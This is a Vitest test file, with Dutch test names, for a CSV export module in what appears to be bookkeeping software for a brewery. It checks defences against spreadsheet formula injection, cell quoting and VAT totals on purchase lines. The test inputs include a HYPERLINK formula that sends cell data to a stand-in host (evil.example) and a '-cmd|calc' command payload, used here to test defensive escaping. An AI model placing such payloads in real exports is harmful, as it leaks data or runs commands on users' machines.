import { describe, it, expect } from 'vitest'
import { csvCel, csvRij, csvTekst, csvBedrag, inkoopRegelExport } from '../csv'

describe('csvCel — formule-injectie', () => {
  it('zet een apostrof voor waarden die als formule starten', () => {
    expect(csvCel('=1+1')).toBe(`"'=1+1"`)
    expect(csvCel('=HYPERLINK("https://evil.example/?d="&A1,"klik")'))
      .toBe(`"'=HYPERLINK(""https://evil.example/?d=""&A1,""klik"")"`)
    expect(csvCel('+31 6 1234')).toBe(`"'+31 6 1234"`)
    expect(csvCel('-cmd|calc')).toBe(`"'-cmd|calc"`)
    expect(csvCel('@SUM(A1)')).toBe(`"'@SUM(A1)"`)
    expect(csvCel('\t=1')).toBe(`"'\t=1"`)
    expect(csvCel('\r=1')).toBe(`"'\r=1"`)
  })
  it('laat getallen en bedragen ongemoeid, ook negatief', () => {
    expect(csvCel('-12,50')).toBe('"-12,50"')
    expect(csvCel('-12.50')).toBe('"-12.50"')
    expect(csvCel('12.00')).toBe('"12.00"')
    expect(csvCel('0')).toBe('"0"')
    expect(csvCel(-3)).toBe('"-3"')
    expect(csvCel(21)).toBe('"21"')
  })
  it('laat gewone tekst en datums staan', () => {
    expect(csvCel('2026-09-01')).toBe('"2026-09-01"')
    expect(csvCel('F2026-0012')).toBe('"F2026-0012"')
    expect(csvCel('— Grondstoffen')).toBe('"— Grondstoffen"')
  })
  it('verdubbelt aanhalingstekens (kolommen schuiven niet meer)', () => {
    expect(csvCel('Café "De Kroon"')).toBe('"Café ""De Kroon"""')
    // Een losse cel met een formule erachter kan niet meer ontstaan.
    expect(csvCel('x","=1+1')).toBe('"x"",""=1+1"')
  })
  it('null en undefined worden een lege cel', () => {
    expect(csvCel(null)).toBe('""')
    expect(csvCel(undefined)).toBe('""')
  })
})

describe('csvRij / csvTekst / csvBedrag', () => {
  it('voegt cellen samen met het scheidingsteken', () => {
    expect(csvRij(['a', '=b', 1])).toBe(`"a","'=b","1"`)
    expect(csvRij(['a', 'b'], ';')).toBe('"a";"b"')
  })
  it('regels met een newline, zonder BOM', () => {
    expect(csvTekst([['a'], ['b', 'c']])).toBe('"a"\n"b","c"')
  })
  it('bedrag met twee decimalen, leeg als onbekend', () => {
    expect(csvBedrag(12.5)).toBe('12.50')
    expect(csvBedrag(null)).toBe('')
    expect(csvBedrag(undefined)).toBe('')
  })
})

describe('inkoopRegelExport', () => {
  it('huidige inkoopregel: naam, btw_tarief, netto + btw_bedrag → bruto', () => {
    expect(inkoopRegelExport({naam: 'Pilsmout 25 kg', type: 'ingredient', netto: 42.1, btw_tarief: 9, btw_bedrag: 3.79}))
      .toEqual({omschrijving: 'Pilsmout 25 kg', btwPct: 9, netto: 42.1, btwBedrag: 3.79, bruto: 45.89})
  })
  it('oude boeking: omschrijving, btw_pct, prijs_per_stuk en totaal', () => {
    expect(inkoopRegelExport({omschrijving: 'Energie', hoeveelheid: 1, prijs_per_stuk: 123.97, btw_pct: 21, totaal: 150}))
      .toEqual({omschrijving: 'Energie', btwPct: 21, netto: 123.97, btwBedrag: 26.03, bruto: 150})
  })
  it('verlegde BTW: tarief blijft zichtbaar, BTW 0, bruto = netto', () => {
    expect(inkoopRegelExport({naam: 'Hop (DE)', netto: 80, btw_tarief: 21, btw_bedrag: 0, btw_soort: 'intracom'}))
      .toEqual({omschrijving: 'Hop (DE)', btwPct: 21, netto: 80, btwBedrag: 0, bruto: 80})
  })
  it('rekent cent-exact', () => {
    expect(inkoopRegelExport({naam: 'x', netto: 0.1, btw_tarief: 21, btw_bedrag: 0.2}).bruto).toBe(0.3)
  })
  it('lege regel geeft lege kolommen, geen NaN', () => {
    expect(inkoopRegelExport({})).toEqual({omschrijving: '', btwPct: '', netto: null, btwBedrag: null, bruto: null})
  })
})
